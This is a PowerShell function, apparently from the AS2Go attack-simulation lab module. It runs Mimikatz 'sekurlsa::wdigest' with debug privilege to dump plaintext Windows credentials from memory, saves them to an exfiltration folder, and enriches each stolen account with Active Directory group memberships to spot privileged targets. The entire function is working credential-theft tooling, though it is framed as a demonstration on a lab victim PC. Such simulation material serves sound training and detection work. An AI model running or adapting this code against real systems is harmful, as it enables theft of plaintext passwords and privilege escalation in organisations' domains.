<#
.SYNOPSIS
Dumps WDigest plaintext credentials from memory and enriches them with AD group membership.

.DESCRIPTION
Requires elevation and, after confirmation, updates the window title and saved lab stage.
Shows the Mimikatz sekurlsa::wdigest command, then runs Mimikatz with it and logs the
output to a session file in the exfiltration folder unless the prompt is declined.
Parses the dump with ConvertFrom-MemoryDump, reports the unique principals found, and
enriches each session with the domain FQDN and AD group memberships from Get-ADPrincipalGroupMembership.
Displays the enriched sessions as a formatted list. An empty dump stops the enrichment with an error message.

.EXAMPLE
Invoke-PriviledgeEscalationViaMemoryAccess
Runs this workflow using the initialized AS2Go module configuration.

.INPUTS
None. This function does not declare pipeline input.

.OUTPUTS
Console messages and output from invoked commands; no dedicated result object is defined.

.NOTES
Private AS2Go function. Run from an initialized AS2Go module session and from an elevated session.
Requires Mimikatz in the module tools folder, WDigest plaintext logons, and writable module configuration.
Run on the victim PC after Set-UseLogonCredential enabled WDigest plaintext credential storage.
Intended for demonstration, because WDigest plaintext storage is disabled by default on modern Windows.

Tested with Get-FileHash -Path $mimikatzPath -Algorithm SHA256 to verify the integrity of the Mimikatz binary.
61C0810A23580CF492A6BA4F7654566108331E7A4134C968C2D6A05261B2D8A1
mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08

.COMPONENT
Category: Main Function

.FUNCTIONALITY
Displays the WDigest plaintext passwords left in memory by cleared or enabled UseLogonCredential.
Dumps them with Mimikatz sekurlsa::wdigest and enriches each account with domain FQDN and AD groups.
#>
function Invoke-PriviledgeEscalationViaMemoryAccess {

    ################################################################################
    #####                                                                      ##### 
    #####    Description                ######                                 
    #####                                                                      #####
    ################################################################################


    $Info = Measure-FunctionRuntime -Begin

    $result = Test-LocalAdministrator

    If (-not $SkipClearHost) { Clear-Host }

    Update-WindowTitle -NewTitle "Priviledge Escalation Through MemoryAccess"
    Set-ASConfig -Setting "LastStage" -Value "Priviledge Escalation Through MemoryAccess"

    Write-AS2GoOutput -Type Header -Message "Attack Phase - Priviledge Escalation Through Memory Access"
    Write-AS2GoOutput -Type H1 -Message $((Get-Help (Get-FunctionName)).Functionality)

    Write-AS2GoOutput -Type NextCommand -Message "Next Command: " -NoNewline
    $command = ".\mimikatz.exe  'privilege::debug' 'sekurlsa::wdigest' 'exit'"
    Write-AS2GoOutput -Type Command -NoExtraLines -Message $command

    if (-not $result.IsElevated) {
        Write-AS2GoOutput -Type Error -Message "This function must be run as Administrator."
        pause
        return
    }

    $decision = Show-DecisionPrompt

    if ($decision -eq $Script:No) {
        Measure-FunctionRuntime -End -Details $Info
        return
    }

    $name = get-date -Format 'yyyyMMddhhmmss'
    $MemoryDump = "$($Script:DefautExfiltrationFolder)\$name.log"

    Invoke-Command -ScriptBlock { & "$($Script:ASTools)\mimikatz.exe"  `
            "log $MemoryDump" `
            "privilege::debug" `
            "sekurlsa::wdigest" `
            "exit" }

    $uniqueResults = @(ConvertFrom-MemoryDump -Unique -Path $MemoryDump)
    
    If ($uniqueResults.Count -eq 0) {
        Write-AS2GoOutput -Type Error -Message "No Security Credentials found in Memory Dump."
    }
    else {
        Write-AS2GoOutput -Type Info -Message "Identified $($uniqueResults.Count) unique principals in Credential Dump."
        #$uniqueResults | fl

        $BestResults = $uniqueResults |
        ForEach-Object {
            $samAccountName = $_.Username
            $netbiosName1 = $_.Domain
            $FQDN = ($Script:AllDomainsDetails | Where-Object { $_.Netbiosname -match $netbiosName1 } | Select-Object DomainFQDN -ExpandProperty DomainFQDN)
            $membership = @(
                Get-ADPrincipalGroupMembership `
                    -Identity $samAccountName `
                    -Server $FQDN |
                Select-Object -Property Name, SID
            )

            $_ | Select-Object `
                Session,
            Domain,
            UserName,
            Password,
            SID,
            LogonServer,
            LogonTime,
            @{
                Name       = 'FQDN'
                Expression = {
                    $Script:AllDomainsDetails |
                    Where-Object { $_.Netbiosname -match $netbiosName1 } |
                    Select-Object -ExpandProperty DomainFQDN
                }
            },
            @{
                Name       = 'GroupMembership'
                Expression = {
                    ($membership | ForEach-Object { $_.Name }) -join ', '
                }
            },
            @{
                Name       = 'GroupMembershipRids'
                Expression = {
                    ($membership | ForEach-Object { $_.SID.Value.split('-')[-1] }) -join ', '
                }
            }
        }
    
    
        $BestResults | format-list | out-host
    
    }

    pause
    Measure-FunctionRuntime -End -Details $Info
}
